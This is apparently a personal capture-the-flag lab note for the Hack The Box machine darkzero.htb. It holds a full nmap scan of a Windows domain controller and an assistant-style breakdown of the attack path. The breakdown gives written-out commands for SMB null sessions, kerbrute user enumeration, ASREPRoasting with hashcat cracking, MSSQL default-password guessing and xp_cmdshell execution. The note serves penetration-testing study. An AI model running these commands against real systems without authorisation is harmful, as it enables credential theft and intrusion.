#Attacking_machine
Full aggressive scan (most comprehensive)

```bash
nmap -sC -sV -A -T4 -p- <MACHINE IP> -oN nmap_full.txt
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-22 18:49 UTC
Nmap scan report for 10.129.12.60
Host is up (0.079s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-22 18:47:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.12.60:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
|_ssl-date: 2026-03-22T18:49:03+00:00; -4m08s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-22T18:33:37
|_Not valid after:  2056-03-22T18:33:37
| ms-sql-info: 
|   10.129.12.60:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49897/tcp open  msrpc         Microsoft Windows RPC
49926/tcp open  msrpc         Microsoft Windows RPC
51111/tcp open  msrpc         Microsoft Windows RPC
65173/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-22T18:48:24
|_  start_date: N/A
|_clock-skew: mean: -4m08s, deviation: 0s, median: -4m08s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   98.05 ms 10.10.14.1
2   98.18 ms 10.129.12.60

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.65 seconds
```


## Output

This is a **Windows Active Directory Domain Controller**. Here's the full breakdown and attack path:

### 🖥️ Target Summary

| Detail | Value |
|---|---|
| Hostname | `DC01.darkzero.htb` |
| Domain | `darkzero.htb` |
| OS | Windows Server 2022 |
| Role | **Domain Controller** |

---

### 🔍 Key Attack Surface

### 🔴 High Interest
| Port | Service | Why It Matters |
|---|---|---|
| **1433** | MSSQL 2022 | Unusual on a DC — potential SA login, `xp_cmdshell`, NTLM relay |
| **5985** | WinRM | Remote shell if you get valid creds |
| **445** | SMB | Null sessions, share enum, relay attacks |
| **88** | Kerberos | ASREPRoasting, Kerberoasting |
| **389/636** | LDAP | Anonymous bind, user/group enumeration |

---

## 🗺️ Recommended Recon Order


### 2. SMB Enumeration (unauthenticated)
```bash
# Check for null session / guest access
netexec smb 10.129.12.60 -u '' -p ''
netexec smb 10.129.12.60 -u 'guest' -p ''

# List shares
netexec smb 10.129.12.60 -u '' -p '' --shares
smbclient -L //10.129.12.60 -N
```

### 3. LDAP Enumeration (anonymous)
```bash
# Try anonymous bind
ldapsearch -x -H ldap://10.129.12.60 -b "DC=darkzero,DC=htb" -s sub "(objectclass=*)" 2>/dev/null | head -50

# Use windapsearch
windapsearch -d darkzero.htb --dc 10.129.12.60 -m users
```

### 4. Kerbrute — User Enumeration
```bash
kerbrute userenum --dc 10.129.12.60 -d darkzero.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### 5. ASREPRoasting (no creds needed)
```bash
impacket-GetNPUsers darkzero.htb/ -dc-ip 10.129.12.60 -no-pass -usersfile users.txt -format hashcat
```
Crack any hashes with:
```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### 6. MSSQL Probe
```bash
# Try default / common logins
netexec mssql 10.129.12.60 -u 'sa' -p '' --local-auth
netexec mssql 10.129.12.60 -u 'sa' -p 'sa' --local-auth

# If you get a hit:
impacket-mssqlclient sa@10.129.12.60 -windows-auth
# Then inside: EXEC xp_cmdshell 'whoami';
```

---

## 💡 Key Observations

- **MSSQL on a DC is unusual** — this is likely the intended foothold. SA or weak credentials could give you direct RCE.
- **SMB signing is required** — rules out classic SMB relay attacks, but NTLM capture/relay to MSSQL may still work.
- The clock skew is only ~4 minutes — Kerberos attacks will work fine (limit is 5 min).
- **WinRM (5985)** is open — once you have any domain user creds, try `evil-winrm`.

---

Start with SMB null session + MSSQL bruteforce in parallel. What do you find? 🎯


**Next step:** [[Adding hosts]]
